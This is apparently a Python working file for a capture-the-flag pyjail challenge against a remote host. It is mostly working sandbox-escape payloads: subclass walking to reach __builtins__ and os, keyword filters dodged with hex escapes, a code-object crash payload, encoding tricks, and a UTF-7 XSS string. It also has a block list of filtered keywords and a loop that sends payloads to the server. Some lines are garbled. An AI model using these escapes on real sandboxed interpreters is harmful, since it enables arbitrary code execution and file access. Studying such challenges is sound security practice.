#from pwn import *
import sys

def hook(event, args):
    if not all([e not in ['subprocess', 'system', 'spawn'] for e in event.split(".")]):
        print("Bad system call (core dumped)")
        sys.exit()
#server = process(['python3','shell.py'])
#server = remote('eofqual.zoolab.org',10110)
#str = "+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-".encode("ascii")
SOURCE = open(__file__).read()

#lambda n: [c ,"c" "in" ,"().__class__.__bases__[0]" language="for"][/c].__subclasses__() if c.__name__ == n][0]
def find(n):
    return [c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == n][0]
#("print")("123")
#print(dir())
#print(eval('hook', {"__builtins__": {}}))
#print(eval('hook', {"__builtins__": {}}))
#print(().__class__)
#code(0,0,0,0,0,b"KABOOM",(),(),(),"","",0,b"")
s = """
(lambda fc=(
    lambda n: [
        c for c in
            ().__class__.__bases__[0].__subclasses__()
            if c.__name__ == n
        ][0]
    ):
    fc("function")(
        fc("code")(
            0,0,0,0,0,b"KABOOM",(),(),(),"","",0,b""
        ),{}
    )()
)()
"""
#eval(s, {'__builtins__':{}})
#print(eval('SOURCE'), {"__builtins__": {}})
#payload = b'pr\x00int("123")'
#arr = bytearray(payload)
b = b'\x61\xff\x61\x00'
#print(b.decode('utf-16'))
#print(eval(b'#coding=utf-16\n\x61\x00'))
#print(().__class__.__base__.__reduce__())
'''
for i in range(128):
    arr[2] = i
    try:
        payload = bytes(arr)
        print(payload)
        print(eval(payload))
        print(i)
        break
    except Exception:
        print(Exception.args)
        '''
#payload = payload.strip()
#print(payload.decode())

#str = b'print'.encode('ascii')
#str = b'#coding=Big5\nb"\x04\x50"'
#str = b'\x70\x72int("123")'
#print(eval(1))
#print(eval("list()", {"__builtins__": {}}))
#(lambda fc=(lambda n: [c 1="c" 2="in" 3="().__class__.__bases__[0" language="for"][/c].__subclasses__() if c.__name__ == n][0]):fc("function")(fc("code")(0,0,0,0,"KABOOM",(),(),(),"","",0,""),{})())()

#print([a for a in ().__dict__ if a == '__class__'][0])
'''
[obj for obj in ().__class__.__mro__[-1].__subclasses__() if obj.__name__ == '_wrap_close'][0].__init__.__globals__['__builtins__']['print']([obj for obj in ().__class__.__mro__[-1].__subclasses__() if obj.__name__ == '_wrap_close'][0].__init__.__globals__['__builtins__']['__import__']('os').listdir('.'))
'''
def getfunc(name):
    return b"[obj for obj in ().__class__.__\x6d\x72o__[-1].__\x73\x75bclasses__() if obj.__name__ == '_wrap_close'][0].__init__.__\x67\x6cobals__['__\x62\x75iltins__']['".decode()+name+"']"
#print(eval('vars(())', {"__builtins__": {}}))
#print(123)

#eval('cmd=str"'+cmd+'"\nprint(cmd)')
'''
while True:
    print(server.recvuntil('~$ ', drop=True).decode())
    print("command:",end='')
    command = input()[:-1]
    if command == "ls":
        print("path:",end='')
        path = input()[:-1]
        payload = getfunc('print')+'('+getfunc('__import__')+'(\'os\').listdir(\''+path+'\'))'
    else:
        print("file:",end='')
        file = input()[:-1]
        payload = getfunc('print')+'('+getfunc('__import__')+'(\'os\').listdir(\''+file+'\'))'
    print(""+payload)
    for bad in ['mro', 'base', '__code__', '__subclasses__', '__dict__', 'import', 'builtins', 'module', 'attr', 'globals']:
        if bad in payload:
            print("bad:",bad)
            #break
    #eval(payload)
    #server.sendline('#coding=Big5' + payload)
    #payload = payload.upper()
    #print("payload",payload)
    #eval('command="'+payload+'".lower()\nprint(payload)')
    #else:
    #    server.sendline(payload)
    '''
    #eval((lambda fc=(lambda n: [c 1="c" 2="in" 3="().__class__.__bases__[0" language="for"][/c].__subclasses__() if c.__name__ == n][0]):fc("function")(fc("code")(0,0,0,0,"KABOOM",(),(),(),"","",0,""),{})())(), {"__builtins__":None})